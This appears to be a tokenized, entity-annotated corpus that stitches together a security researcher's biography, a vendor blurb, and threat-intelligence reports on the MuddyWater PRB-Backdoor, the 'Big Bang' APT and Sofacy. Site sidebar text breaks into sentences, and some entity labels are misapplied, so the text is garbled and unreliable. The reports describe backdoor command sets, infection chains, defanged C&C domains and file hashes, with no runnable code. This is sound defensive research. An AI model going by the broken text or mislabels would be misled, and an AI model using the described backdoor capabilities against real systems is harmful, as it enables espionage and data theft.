engineering
,
security
research
and
so
on
.

Company/Project/Organization

Postion

Time

Strategic
cyber
LLC

Founder
and
Principal

January
,
2012-now

Delaware
Air
National
Guard

Major
2009-now

Cobalt
strike

Automattic

Principal
Investigator

November
,
2011-
May
,
2012

Senior
Security
Engineer

August
,
2010
–
June
,
2011

Code
Wrangler

July
,
2009
–
August
,
2010

Feedback
Army
,
After
the
Deadline

Founder

July
,
2008
–November
,
2009

Air
Force
Research
Laboratory

Systems
Engineer

April
,
2006
–
March
,
2008

US
Air
Force

Communications
and

March
,
2004
-
March
,
2008

Information
Officer

Supported
organizations
:

Collegiate
Cyber
Defense
Competition
(
CCDC
)

North
East
CCDC
2008-2015

Mid
Atlantic
CCDC
2011-2015

Pacific
Rim
CCDC
2012
,
2014

South
East
CCDC
-
2014

Western
Regional
CCDC
-
2013

National
CCDC
2012-2014

Projects
:

Sleep
Scripting
Language

An
extensible
general
purpose
language
with
Perl
inspired
syntax
for
the
Java
platform
.
Sleep
is
open
source
,
licensed
under
the
LGPL
.
jIRCii

Scriptable
Internet
Relay
Chat
client
for
Windows
,
MacOS
X
,
and
Linux
.
jIRCii
is
open
source
,
licensed
under
the
artistic
license
.

Published
works
:

Live-fire
Security
Testing
with
Armitage
and
Metasploit

Get
in
through
the
backdoor
:
Post
exploitation
with
Armitage

Tutorial
:
Hacking
Linux
with
Armitage

The
Design
of
a
Proofreading
Software
Service

Agent-based
Traffic
Generation

Contribution
:
cortana-scripts
metasploit-loader
malleable-c2-profiles
layer2-privoting-client
armitage

Projects
:

Enterprise-level
business
cooperation

After
the
Deadline

Feedback
Army

Cobalt
Strike

Open
source
software

Armitage

Far
East
jIRCii

Moconti

One
Hand
Army
Man
s
phPERL
Same
Game

Sleep

Reference
linking
:
https://plus.google.com/116899857642591292745/posts B_url.normal
(
google+
)
https://github.com/rsmudge B_url.normal
(
GitHub
)
https://www.youtube.com/channel/UCJU2r634VNPeCRug7Y7qdcw B_url.normal
(
youtube
)
http://www.oldschoolirc.com/ B_url.normal
https://twitter.com/rsmudge B_url.normal
http://www.hick.org/~raffi/index.html B_url.normal
http://www.blackhat.com/html/bh-us-12/speakers/Raphael-Mudge.html B_url.normal
http://www.linkedin.com/in/rsmudge   B_url.normal

Appendix
2
About
Antiy

Antiy
Labs
is
a
professional
next-generation
security-testing
engine
R&D
enterprise
.
Antiy's
engines
provide
the
ability
to
detect
various
viruses
and
malware
for
network
security
products
and
mobile
devices
,
which
are
used
by
more
than
ten
well
known
security
vendors
.
Antiy's
engines
are
embedded
in
tens
of
thousands
of
firewalls
and
tens
of
millions
of
mobile
phones
all
over
the
world
.
Antiy
Labs
is
awarded
the
'
Best
Protection
'
prize
by
AV-TEST
in
2013
.
Based
on
engines
,
sandboxes
and
background
systems
,
Antiy
Labs
will
continue
to
provide
traffic-based
anti-APT
solutions
for
enterprises
.

More
information
about
antivirus
engine
,
http://www.antiy.com  B_url.normal
(
Chinese
)

More
information
about
anti-APT
products
of
http://www.antiy.cn  B_url.normal
http://www.antiy.net  B_url.normal
(
English
)

Antiy
,
Trend
Micro

About
TrendLabs
Security
Intelligence
Blog

Home

Categories

Home
'
Targeted
Attacks
'
Another
Potential
MuddyWater
Campaign
uses
Powershell-based
PRB-backdoor

Another
Potential
MuddyWater
Campaign
uses
Powershellbased
PRB-backdoor

Posted
on
:
June
14
,
2018
at
5:00
am
Posted
in
:
Targeted
Attacks
Author
:
Trend
Micro

by
Michael
Villanueva
and
Martin
Co
(
Threats
Analysts
)

The
MuddyWater
campaign
was
first
sighted
in
2017
when
it
targeted
the
Saudi
government
using
an
attack
involving
PowerShell
scripts
deployed
via
Microsoft
Office
Word
macro
.

In
March
2018
,
we
provided
a
detailed
analysis
of
another
campaign
that
bore
the
hallmarks
of
MuddyWater
.

In
May
2018
,
we
found
a
new
sample
(
Detected
as
W2KM_DLOADR.UHAOEEN
)
that
may
be
related
to
this
campaign
.

Like
the
previous
campaigns
,
these
samples
again
involve
a
Microsoft
Word
document
embedded
with
a
malicious
macro
that
is
capable
of
executing
PowerShell
(
PS
)
scripts
leading
to
a
backdoor
payload
.

One
notable
difference
in
the
analyzed
samples
is
that
they
do
not
directly
download
the
Visual
Basic
Script
(
VBS
)
and
PowerShell
component
files
,
and
instead
encode
all
the
scripts
on
the
document
itself
.

The
scripts
will
then
be
decoded
and
dropped
to
execute
the
payload
without
needing
to
Search
:

Featured
Stories
systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux

qkG B_malware.ransom
Filecoder I
:
Self-Replicating
,
Document-
Encrypting
Ransomware

Mitigating
CVE-2017-5689
,
an
Intel
Management
Engine
Vulnerability

A
Closer
Look
at
North
Korea's
Internet

From
Cybercrime
to
Cyberpropaganda

Security
Predictions
for
2018

Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,
download
the
component
files
.

As
mentioned
earlier
,
our
analysis
of
the
sample
revealed
characteristics
that
likely
connect
it
to
the
MuddyWater
campaign
,
in
particular
:

The
delivery
method
,
which
involves
the
use
of
a
malicious
document
with
an
embedded
macro
as
a
lure
for
potential
victims
The
obfuscation
method
for
the
macro
scripts
,
which
will
result
in
an
intended
backdoor
payload
.

This
method
is
commonly
used
in
samples
that
were
used
in
the
MuddyWater
campaign
Infection
chain
IoT
hacks
,
and
operational
disruptions
.

The
ever-shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
.

Read
our
security
predictions
for
2018
.

Business
Process
Compromise

Figure
1
.

Comparison
of
the
infection
chains
used
in
the
previous
and
current
campaigns

Technical
details

The
sample
we
analyzed
was
a
Word
document
used
as
a
lure
for
unsuspecting
victims
.

However
,
unlike
the
samples
from
the
previous
campaigns
,
the
lure
document
deals
with
a
different
subject
matter
.

Instead
of
using
government
or
telecommunications-related
documents
,
the
new
lure
document
presents
itself
as
a
reward
or
promotion
,
which
could
indicate
that
the
targets
are
no
longer
limited
to
specific
industries
or
organizations
.

Attackers
are
starting
to
invest
in
longterm
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:
Business
Process
Compromise
.

Recent
Posts

Another
Potential
MuddyWater
Campaign
uses
Powershell-based
PRB-Backdoor  B_malware.backdoor

June
Patch
Tuesday
:
Microsoft
Addresses
DNSrelated
Vulnerability
,
Adobe
Patches
Critical
Flash
Player
Flaw

How
Machine
Learning
Techniques
Helped
Us
Find
Massive
Certificate
Abuse
by
BrowseFox

Attack
Vectors
in
Orbit
:
The
Need
for
IoT
and
Satellite
Security
in
the
Age
of
5G

New
KillDisk
Variant
Hits
Latin
American
Financial
Organizations
Again

Figure
2
.

Sample
lure
document
used
in
the
new
campaign

The
document
is
designed
to
trick
users
into
enabling
the
macro
to
view
its
full
content
.

However
,
the
macro's
true
purpose
is
to
allow
it
to
execute
malicious
routines
without
the
user's
knowledge
.

Once
the
macro
is
enabled
,
it
will
use
the
Document_Open(
)
event
to
automatically
execute
the
malicious
routine
if
either
a
new
document
using
the
same
template
is
opened
or
when
the
template
itself
is
opened
as
a
document0
.

Popular
Posts

Malicious
Edge
and
Chrome
Extension
Used
to

Deliver
backdoor

GPON
Vulnerabilities
Exploited
for
Mexico-based

Mirai B_malware.backdoor
-
like
Scanning
Activities

Confucius
Update
:
New
Tools
and
Techniques
,

Further
Connections
with
Patchwork

Legitimate
Application
AnyDesk
Bundled
with
New

Ransomware
Variant

Malicious
Traffic
in
Port
7001
Surges
as
Cryptominers
Target
Patched
2017
Oracle
WebLogic
Vulnerability

Stay
Updated

Email
Subscription

Your
email
here

Subscribe

Figure
3
.

Executing
the
malicious
routine
via
Document_Open
(
)

The
malicious
macro's
code
snippet
uses
three
main
functions
,
specifically
:

The
function
contained
in
the
RED
box
is
the
Document_Open
(
)
event
,
where
all
the
subfunctions
will
be
executed
/
called
.

The
code
inside
the
GREEN
box
manipulates
the
images
shown
in
the
document's
body
.

The
code
inside
the
BLUE
box
constructs
the
main
Powershell
commands
and
scripts
.

These
will
be
executed
to
perform
the
main
routine
.

Figure
4
.

A
snippet
of
the
malicious
macro's
code
,
marked
with
colored
boxes
to
show
the
different
functions

Decoding
and
deobfuscation

Analysis
of
the
code
revealed
a
PowerShell
script
capable
of
decoding
the
contents
of
the
malicious
document
,
which
results
in
the
execution
of
yet
another
encoded
PowerShell
script
.

Figure
5
.

The
Powershell
script
contained
in
the
sample's
code

Figure
6
.

The
second
encoded
PowerShell
script
,
which
is
executed
after
the
first
script
is
decoded

This
will
then
result
in
more
readable
PowerShell
scripts
capable
of
dropping
various
components
in
the
%Application
Data%\Microsoft\CLR\*
directory
.

The
main
PowerShell
file
invoker.ps1
uses
these
components
to
run
the
final
payload
,
PRB-Backdoor  B_malware.backdoor
,
previously
analyzed
by
other
security
researchers
in
May
2018
.

Figure
7
:
The
components
dropped
in
the
%Application
Data%\Microsoft\CLR\*
directory

PRB-Backdoor  B_malware.backdoor
is
a
backdoor
that
takes
its
name
from
the
function
used
in
the
final
PowerShell
script
payload
,
as
seen
in
the
figure
below
.

Figure
8
.

The
PS
function
from
which
PRB-Backdoor  B_malware.backdoor
takes
its
name

The
backdoor
communicates
with
its
Command-and-Control
(
C&C
server
)
,
hxxp://outl00k[.]net  B_url.unknown
,
to
send
and
receive
the
following
commands
:
Command

PRB-CREATEALIVE

Details

Initializes
connection
with
the
C&C
Server

PRB-CREATEINTRODUCE

Registers
/
introduces
the
affected
machine
to

PRB-History
the
C&C
server

Gather
browsing
histories
from
different
browsers
and
send
it
to
the
C&C
server
using
the
'
sendfile
'
function

PRB-PASSWORD

Steals
passwords
listed
or
found
in
the

PRB-READFILE

PRB-WRITEFILE

PRB-Shell

PRB-Logger
browser
histories

Reads
files

Writes
files

Executes
shell
commands

Calls
the
'
Logger
'
function
,
used
to
record
keyboard
strokes

PRB-Shot

Triggers
the
SNAP
function
,
used
to
capture

PRB-funcupdate
sysinfo

Start_Dns
screenshots

Updates
functions

Gathers
system
information

Initializes
DNS
Session/Connection

If
these
samples
are
indeed
related
to
MuddyWater
,
this
means
that
the
threat
actors
behind

MuddyWater
are
continuously
evolving
their
tools
and
techniques
to
make
them
more
effective
and
persistent
.

Countermeasures
and
Trend
Micro
Solutions

Given
the
use
of
lure
documents
designed
with
social
engineering
in
mind
,
it
is
likely
that
the
attackers
use
phishing
or
spam
to
target
users
who
are
unaware
of
these
documents
'
malicious
nature
.

Awareness
can
effectively
mitigate
or
stop
these
kinds
of
attacks
from
being
successful
.

The
first
step
is
to
be
able
to
identify
phishing  B_ip.attack
attacks I
and
distinguish
legitimate
emails
from
malicious
ones
.

Telltale
signs
of
social
engineering
include
'
too-good-to-be-true
'
offers
and
messages
that
lack
context
.

In
general
,
users
should
always
practice
caution
when
it
comes
to
email
.

This
includes
avoiding
clicking
on
links
or
downloading
any
documents
unless
certain
that
these
are
legitimate
.

Trend
MicroTM
Deep
DiscoveryTM
provides
detection
,
in-depth
analysis
,
and
proactive
response
to
today's
stealthy
malware
,
and
targeted
attacks
in
real
time
.

It
provides
a
comprehensive
defense
tailored
to
protect
organizations
against
targeted
attacks
and
advanced
threats
through
specialized
engines
,
custom
sandboxing
,
and
seamless
correlation
across
the
entire
attack
lifecycle
,
allowing
it
to
detect
threats
even
without
any
engine
or
pattern
update
.

Trend
MicroTM
Hosted
Email
Security
is
a
no-maintenance
cloud
solution
that
delivers
continuously
updated
protection
to
stop
spam
,
malware
,
spear B_ip.attack
phishing I
,
ransomware
,
and
advanced
targeted
attacks
before
they
reach
the
network
.

Trend
MicroTM
Deep
DiscoveryTM
Email
Inspector
and
InterScanTM
Web
Security
prevent
malware
from
ever
reaching
end
users
.

At
the
endpoint
level
,
Trend
MicroTM
Smart
Protection
Suites
deliver
several
capabilities
that
minimize
the
impact
of
these
attacks
.

These
solutions
are
powered
by
the
Trend
Micro
XGenTM
security
,
which
provides
a
crossgenerational
blend
of
threat
defense
techniques
against
a
full
range
of
threats
for
data
centers
,
cloud
environments
,
networks
,
and
endpoints

It
features
high-fidelity
machine
learning
to
secure
the
gateway
and
endpoint
data
and
applications
,
and
protects
physical
,
virtual
,
and
cloud
workloads
.

Indicators
of
Compromise
(
IoCs
)
:

Detected
as
W2KM_DLOADR.UHAOEEN
240b7d2825183226af634d3801713b0e0f409eb3e1e48e1d36c96d2b03d8836b
Related
Posts
:

Related
Posts
:

Campaign
Possibly
Connected
to
'
MuddyWater
'
Surfaces
in
the
Middle
East
and

Central
Asia

ChessMaster
Adds
Updated
Tools
to
Its
Arsenal

Learn
how
to
protect
Enterprises
,
Small
Businesses
,
and
Home
Users
from
ransomware
:

ENTERPRISE

SMALL
BUSINESS

HOME

Tags
:
MuddyWater

Powershell

PRB-Backdoor  B_malware.backdoor
targeted
attacks
Windows
Powershell

HOME
AND
HOME
OFFICE
|

FOR
BUSINESS
|

SECURITY
INTELLIGENCE
|

ABOUT
TREND
MICRO

Asia
Pacific
Region
(
APAC
)
:
Australia
/
New
Zealand
,
中国
,
日本
,
대한민국
,
台灣

Europe
,
Middle
East
,
&
Africa
Region
(
EMEA
)
:
France
,
Deutschland
/
Österreich
/
Schw
eiz
,
Italia
,
Россия
,
España
,
United
Kingdom
/
Ireland

Latin
America
Region
(
LAR
)
:
Brasil
,
México

North
America
Region
(
NABU
)
:
United
States
,
Canada

Privacy
Statement

Legal
Policies

Copyright
©
2018
Trend
Micro
Incorporated
.

All
rights
reserved
.
CHECKPOINT.COM

PUBLICATIONS

TOOLS

ABOUT
US

CONTACT
US

SUBSCRIBE

Search
IPS
Protections
,
Malware
Families
,
Applications
and
more
...

APT
Attack
In
the
Middle
East
:
The
Big B_malware.infosteal
Bang  i

July
8
,
2018

Over
the
last
few
weeks
,
the
Check
Point
Threat
Intelligence
Team
discovered
the
comeback
of
an
APT
surveillance
attack
against
institutions
across
the
Middle
East
,
specifically
the
Palestinian
Authority
.

The
attack
begins
with
a
phishing
email
sent
to
targets
that
includes
an
attachment
of
a
self-extracting
archive
containing
two
files
:
a
Word
document
and
a
malicious
executable
.

Posing
to
be
from
the
Palestinian
Political
and
National
Guidance
Commission
,
the
Word
document
serves
as
a
decoy
,
distracting
victims
while
the
malware
is
installed
in
the
background
.

The
malware
has
several
modules
,
some
of
which
are
:

Taking
a
screenshot
of
the
infected
machine
and
sending
it
to
the
C&C
server
.

Sending
a
list
of
documents
with
file
extensions
including
.doc
,
.odt
,
.xls
,
.ppt
,
.pdf
and
more
.

Logging
details
about
the
system
.

Rebooting
the
system
.

Self-destructing
the
executable
.

While
it
is
not
clear
exactly
what
the
attacker
is
looking
for
,
what
is
clear
is
that
once
he
finds
it
,
a
second
stage
of
the
attack
awaits
,
fetching
additional
modules
and/or
malware
from
the
Command
and
Control
server
.
This
then
is
a
surveillance
attack
in
progress
and
has
been
dubbed
'
Big B_malware.infosteal
Bang  i
'
due
to
the
attacker's
fondness
for
the
'
Big
Bang
Theory
'
TV
show
,
after
which
some
of
the
malware's
modules
are
named
.

A
previous
campaign
of
this
APT
group
was
uncovered
by
Talos
in
June
2017
,
and
since
then
very
little
of
this
operation
was
seen
in
the
wild
.
The
Big B_malware.infosteal
Bang  i
campaign
described
below
incorporates
improved
capabilities
and
offensive
infrastructure
,
and
seems
to
be
even
more
targeted
.

What's
New
in
Ramallah
?

The
first
instances
of
the
current
campaign
began
to
appear
in
the
middle
of
April
this
year
.
But
,
thanks
to
the
attackers
known
affection
for
decoy
documents
that
pose
as
news
summaries
,
we
were
able
to
date
the
campaign
back
to
March
2018
.

This
campaign
,
as
well
as
those
in
its
previous
form
,
uses
phishing
methods
to
deliver
its
reconnaissance
stage
malware
.
But
unlike
in
2017
,
this
time
the
malicious
attachment
is
an
executable
which
is
actually
a
self-extracting
archive
,
containing
a
decoy
document
and
the
malware
itself
.

It
is
almost
superfluous
to
mention
that
in
order
to
give
the
file
a
legitimate
look
,
the
developers
pinned
it
to
a
Word
icon
and
called
it
'
ي    ا
     ا
      ا
'
(
Monthly
Press
Report
)
.

When
this
file
is
double
clicked
,
it
opens
a
Word
document
with
the
logo
of
the
Palestinian
Political
and
National
Guidance
Commission
.
This
document
pretends
to
be
a
press
report
and
contains
news
headlines
that
were
actually
copied
from
various
Palestinian
news
websites
.

While
the
victim
is
distracted
with
the
legitimate
looking
Word
document
,
an
additional
executable
which
is
archived
alongside
the
decoy
document
is
installed
in
the
background
.

Figure
1
:
Screenshot
of
Word
Document
.

Although
the
archive
was
found
on
mid-April
,
the
Word
document
shows
that
it
was
last
edited
on
March
29
,
2018
.
This
date
is
also
mentioned
in
the
document's
body
and
used
as
its
title
,
'
29-3.doc
'
.
The
metadata
in
the
document
shows
that
it
was
also
titled
'
    
  أ
م   /
     ا
ةد   
'
,
which
happens
to
be
the
name
of
the
Guidance
Commission
Office's
Chief
Executive
:

The
naming
convention
and
content
of
the
file
may
indicate
an
attacker's
familiarity
with
the
nature
of
the
victim
.

Analysis

While
the
analysis
below
discloses
the
capabilities
of
the
spotted
malware
,
we
are
pretty
sure
it
is
part
of
a
multi-staged
attack
that
targets
very
specific
victims
.
The
malware
below
is
part
of
the
reconnaissance
stage
and
should
lead
to
the
main
course
,
whose
nature
is
still
unknown
.

As
for
the
malware's
language
,
during
the
2017
campaign
the
group
used
a
fairly
unsophisticated
malware
,
dubbed
'
Micropsia B_malware.infosteal
'
,
written
in
C++
and
wrapped
in
Delphi
.
In
this
year's
campaign
,
the
attackers
use
an
upgraded
variant
of
this
malware
,
still
written
in
C++
but
wrapped
as
a
self-extracting
executable
.

The
Executable

The
executable
contained
in
the
archive
is
called
'
DriverInstallerU.exe  B_malware.drop
'
but
its
metadata
shows
that
its
original
name
is
'
Interenet  B_malware.drop
Assistant.exe i
'
.

Once
it
is
executed
,
the
malware
ensures
its
persistence
by
setting
a
mutex
(
'
InterenetAssistantN B_malware.infosteal
'
)
,
copying
itself
to
the
'
ProgramData
'
directory
,
and
adding
itself
to
the
scheduled
tasks
.

Once
secured
,
the
malware
communicates
,
by
default
,
with
a
primary
hardcoded
command
and
control
website
that
varies
in
different
samples
(
spgbotup[.]club
)
.
The
APT
actors
,
hardcoded
additional
backup
C&C
website
(
lindamullins[.]info  B_url.cncsvr
)
that
is
contacted
in
case
the
malware
does
not
get
a
response
from
the
first
website
.
This
is
likely
to
be
a
mechanism
that
the
threat
actors
implemented
in
order
to
handle
cases
in
which
they
would
have
to
go
through
infrastructure
changes
.

Figure
3
:
Hardcoded
2
command
and
Control
Websites
.

Once
the
sample
is
able
to
reach
the
main
C&C
,
the
first
thing
it
does
is
fingerprint
the
system
(
user
and
PC
names
,
OS
version
and
AntiVirus
engines
)
,
and
exfiltrate
the
gathered
information
.

Figure
4
:
Initial
Beacon
.

Following
this
,
a
POST
request
is
sent
to
the
C&C
every
once
in
a
while
(
/api/serv/requests/[base64_fingerprint] B_url.cncsvr
)
,
and
in
turn
,
the
C&C
sends
back
a
configuration
file
that
turns
on
specific
functionalities
of
the
malware
.

Figure
5
:
C&C
Commands

What
is
interesting
is
that
each
key
in
this
configuration
file
represents
a
different
module
in
the
executable
,
and
when
the
key
is
marked
as
true
the
executable
will
run
the
relevant
module's
content
.
In
addition
,
the
names
of
those
modules
are
taken
from
the
popular
sitcom
,
'
The
Big
Bang
Theory
'
,
in
addition
to
actors
'
names
from
the
popular
Turkish
TV
series
'
Resurrection
:
Ertugrul
'
(
Celal
Al
,
Sonmez
and
Gokhan
)
.

In
the
configuration
file
we
found
thirteen
keys
for
thirteen
different
modules
.
However
,
in
our
samples
we
could
find
only
five
corresponding
modules
.
This
could
mean
that
this
campaign
is
evolving
and
that
there
will
likely
be
more
samples
in
the
future
that
will
implement
the
missing
parts
.

The
following
table
describes
the
role
of
each
module
:

Module
Name

Purpose

Penny

Takes
a
screenshot
of
the
infected
machine
and
sends
it
to
the
server

Wolowitz_Helberg  B_malware.unknown

Enumerates
running
processes
,
saves
their
names
and
their
IDs
in
'
sat.txt
'
and
sends
the
file
to
the
server

Celal_Al  B_malware.unknown

Sends
a
list
of
documents
with
certain
extensions
.
The
extensions
are
:
doc
,
docx
,
odt
,
xls
,
xlsx
,
ppt
,
pptx
,
accdb
,
accde
,
mdb
,
pdf
,
csv

Runfile

Runs
a
file
,
receives
a
process
name
and
a
file
type
from
the
server

Nayyar_Sonmez  B_malware.unknown

Downloads
a
file
with
a
'
.txt
'
extension
from
a
given
URL
,
changes
the
extension
to
'
.exe
'
and
runs
it

Koothrappali  B_malware.unknown

Logs
details
about
the
system
and
sends
them
to
the
server

Bialik_Gokhan  B_malware.unknown

Hofstadter  B_malware.unknown

Reboots
the
system

Terminates
a
process
by
name

Parsons_Sheldon  B_malware.unknown

Deletes
the
payload
from
the
startup
folder
and
deletes
the
actual
file

Reshad_Strik  B_malware.unknown

Sends
a
list
of
the
partitions
found
on
the
infected
machine

Pinar8  B_malware.unknown

Mehmet7  B_malware.unknown

Bahar6  B_malware.unknown

No
such
module
in
our
sample

No
such
module
in
our
sample

No
such
module
in
our
sample

It
is
important
to
note
that
unlike
RATs
that
try
to
keylog
the
infected
system
and
harvest
credentials
,
this
sample
shows
the
irregular
behavior
of
looking
for
Microsoft
Office
documents
on
the
victim's
machine
,
or
enumerating
partitions
.
In
addition
,
the
file
has
the
capability
of
downloading
and
running
another
executable

After
reviewing
all
the
malware
functionalities
,
we
are
confident
in
saying
that
the
attackers
look
for
victims
who
answer
well-defined
characteristics
and
believe
that
further
stages
of
the
attack
are
delivered
only
to
those
who
fit
the
specific
victim
profile
.

The
Attacker's
English
Level

The
typo
in
the
file's
name
(
Interenet  B_malware.drop
Assistant i
)
helped
us
find
another
executable
with
the
same
name
that
is
almost
identical
to
the
original
one
.
In
addition
,
using
the
communication
pattern
we
were
able
to
find
another
sample
called
'
DriverInstallerU  B_malware.drop
'
.
In
this
sample
,
however
,
the
module
names
were
changed
from
actors
and
characters
'
names
to
car
models
,
namely
'
BMW_x1  B_malware.unknown
'
,
'
BMW_x2  B_malware.unknown
'
and
up
to
'
BMW_x8  B_malware.unknown
'
.

But
typos
are
not
the
only
English
mistakes
of
this
APT
group
.
Incorrect
grammar
phrases
in
the
C2
websites
also
assisted
in
uncovering
the
operation
infrastructure
.

Unlike
what
is
generally
expected
from
a
C&C
,
browsing
the
websites
actually
returns
the
following
response
:

Websites
related
to
this
campaign
use
readymade
bootstrap
templates
,
but
include
unique
and
grammatically
incorrect
strings
such
as
'
Probably
the
most
Music
Site
in
the
world
!
'
,
and
'
contact@namylufy[.]com
'
in
some
of
the
websites
.

Those
strings
helped
us
find
other
websites
that
use
the
same
template
,
and
while
they
could
not
be
linked
to
specific
malware
samples
,
it
is
possible
that
they
will
be
used
in
the
future
.

Looking
Back

While
the
APT
has
gone
through
significant
upgrades
over
the
past
year
,
the
conductors
of
these
campaigns
maintained
evident
fingerprints
,
both
in
the
delivery
methods
and
malware
development
conventions
.
These
unique
traces
assisted
us
in
correlating
the
current
wave
to
past
attacks
,
and
may
also
have
some
resemblance
to
attacks
related
to
the
Gaza
Cybergang
APT
group
.

During
our
investigation
we
spotted
three
instances
of
the
renewed
operation
,
but
unique
artifacts
in
the
command
and
control
website
revealed
a
wider
infrastructure
that
may
well
manage
more
unknown
samples
.

In
addition
,
the
concept
of
using
self-extracting
archives
and
decoy
documents
is
not
groundbreaking
or
new
,
as
we
have
seen
similar
attacks
being
carried
in
the
past
by
the
Gaza
Cybergang
APT
group
.

There
were
,
however
,
many
similarities
between
the
samples
we
found
and
the
ones
which
were
found
during
the
2017
campaign
,
such
as
the
usage
of
actor
and
character
names
from
renowned
TV
series
,
as
well
as
fingerprinting
the
system
and
sending
the
information
to
the
C&C
.
According
to
Talos
,
those
files
were
distributed
to
victims
in
the
Palestinian
law
enforcement
agencies
during
2017
.

However
,
in
2017
the
group
used
an
executable
wrapped
in
Delphi
,
whereas
the
sample
we
found
uses
a
self-extracting
archive
.
Both
of
the
above
open
a
document
as
well
as
another
executable
(
written
in
C++
)
when
they
are
double
clicked
.

Finally
,
the
C&C
communication
has
also
been
improved
in
the
recent
campaign
,
as
backup
domains
did
not
appear
in
the
old
ones
.
In
addition
,
the
newer
malware
strain
has
stronger
capabilities
and
a
wider
functionality
than
the
older
one
,
which
would
only
send
information
about
the
system
version
.

Conclusion

With
the
experience
gained
from
the
APT
attack
that
began
in
March
2017
,
it
seems
this
campaign
has
evolved
into
an
attack
with
new
capabilities
,
and
an
even
more
specific
target
,
over
a
year
later
.

Although
the
group
behind
it
seems
to
be
focused
on
carefully
selecting
their
victims
,
using
a
custommade
info-stealer
for
intelligence
gathering
operations
,
due
to
its
very
nature
it
is
difficult
to
assert
what
the
ultimate
goal
of
this
campaign
is
.
Indeed
,
the
next
stages
of
the
attack
may
even
still
be
in
the
works
,
not
yet
deployed
or
only
deployed
to
selected
few
victims
.

In
addition
,
although
the
clear
fingerprints
of
the
perpetrators
leave
no
doubt
we
are
witnessing
the
comeback
of
the
same
APT
,
it
is
still
not
yet
confirmed
exactly
who
the
threat
group
behind
this
campaign
actually
is
.
As
no
concrete
attribution
has
yet
been
made
,
due
to
the
shared
interests
and
malware
features
of
both
2017
and
2018
campaigns
,
the
Gaza
Cybergang
may
be
a
good
starting
point
for
further
research
.

Indicators
of
Compromise
a210ac6ea0406d81fa5682e86997be25c73e9d1b
994ebbe444183e0d67b13f91d75b0f9bcfb011db
74ea60b4e269817168e107bdccc42b3a1193c1e6
511bec782be41e85a013cbea95725d5807e3c2f2
9e093a5b34c4e5dea59e374b409173565dc3b05b
lindamullins[.]info  B_url.cncsvr
spgbotup[.]club B_url.unknown
namyyeatop[.]club B_url.unknown
namybotter[.]info B_url.unknown
sanjynono[.]website B_url.unknown
exvsnomy[.]club B_url.unknown
ezofiezo[.]website B_url.unknown
hitmesanjjoy[.]pro B_url.unknown

PUBLICATIONS

TOOLS

SANDBLAST
FILE
ANALYSIS

URL
CATEGORIZATION

INSTANT
SECURITY
ASSESSMENT

LIVE
THREAT
MAP

GLOBAL
CYBER
ATTACK
REPORTS

RESEARCH
PUBLICATIONS

INCIDENT
RESPONSE

IPS
ADVISORIES

CHECK
POINT
BLOG

DEMOS

ABOUT
US

SUBSCRIBE

CONTACT
US
©
1994-2018
Check
Point
Software
Technologies
LTD
.
All
rights
reserved
.

Propery
of
checkpoint.com
|
Privacy
Policy

Subscribe
to
Cyber
Intelligence
Reports
for
the
most
current
news
and
insights
.
﻿Activity

By
GReAT
on
February
20
,
2018
.
2:00
pm

Sofacy
,
also
known
as
APT28
,
Fancy
Bear
,
and
Tsar
Team
,
is
a
highly
active
and
prolific
APT
.

From
their
high
volume
0day B_malware.unknown
deployment I
to
their
innovative
and
broad
malware
set
,
Sofacy
is
one
of
the
top
groups
that
we
monitor
,
report
,
and
protect
against
.

2017
was
not
any
different
in
this
regard
.

Our
private
reports
subscription
customers
receive
a
steady
stream
of
YARA
,
IOC
,
and
reports
on
Sofacy
,
our
most
reported
APT
for
the
year
.

This
high
level
of
cyber-espionage B_malware.infosteal
activity
goes
back
years
.

In
2011-2012
,
the
group
used
a
relatively
tiny
implant
(
known
as
'
Sofacy
'
or
SOURFACE
)
as
their
first
stage
malware
,
which
at
the
time
had
similarities
with
the
old
Miniduke B_malware.backdoor
implants
.

This
made
us
believe
the
two
groups
were
connected
,
although
it
looks
they
split
ways
at
a
certain
point
,
with
the
original
Miniduke B_malware.backdoor
group
switching
to
the
CosmicDuke B_malware.backdoor
implant
in
2014
.

The
division
in
malware
was
consistent
and
definitive
at
that
point
.

In
2013
,
the
Sofacy
group
expanded
their
arsenal
and
added
more
backdoors
and
tools
,
including
CORESHELL B_malware.backdoor
,
SPLM B_malware.backdoor
(
aka B_malware.backdoor
Xagent I
,
aka B_malware.backdoor
CHOPSTICK I
)
,
JHUHUGIT B_malware.backdoor
(
which
is
built
with
code
from
the
Carberp
sources
)
,
AZZY B_malware.backdoor
(
aka B_malware.backdoor
ADVSTORESHELL I
,
NETUI B_malware.backdoor
,
EVILTOSS B_malware.backdoor
,
and
spans
across
4-5
generations
)
and
a
few
others
.

We've
seen
quite
a
few
versions
of
these
implants
,
which
were
relatively
widespread
at
some
point
or
still
are
.

In
2015
we
noticed
another
wave
of
attacks
which
took
advantage
of
a
new
release
of
the
AZZY B_malware.backdoor
implant
,
largely
undetected
by
antivirus
products
.

The
new
wave
of
attacks
included
a
new
generation
of
USB
stealers
deployed
by
Sofacy
,
with
initial
versions
dating
to
February
2015
.

It
appeared
to
be
geared
exclusively
towards
high
profile
targets
.

Sofacy's
reported
presence
in
the
DNC
network
alongside
APT29
brought
possibly
the
highest
level
of
public
attention
to
the
group's
activities
in
2016
,
especially
when
data
from
the
compromise
was
leaked
and
'
weaponized
'
.

And
later
2016
,
their
focus
turned
towards
the
Olympics
'
and
the
World
Anti-Doping
Agency
(
WADA
)
and
Court
of
Arbitration
for
Sports
(
CAS
)
,
when
individuals
and
servers
in
these
organizations
were
phished
and
compromised
.

In
a
similar
vein
with
past
CyberBerkut
activity
,
attackers
hid
behind
anonymous
activist
groups
like
'
anonpoland
'
,
and
data
from
victimized
organizations
were
similarly
leaked
and
'
weaponized
'
.

This
write-up
will
survey
notables
in
the
past
year
of
2017
Sofacy
activity
,
including
their
targeting
,
technology
,
and
notes
on
their
infrastructure
.

No
one
research
group
has
100%
global
visibility
,
and
our
collected
data
is
presented
accordingly
.

Here
,
external
APT28
reports
on
2017
Darkhotelstyle
activity
in
Europe
and
Dealer's B_malware.backdoor
Choice I
spearphishing I
are
of
interest
.

From
where
we
sit
,
2017
Sofacy
activity
starts
with
a
heavy
focus
on
NATO
and
Ukrainian
partners
,
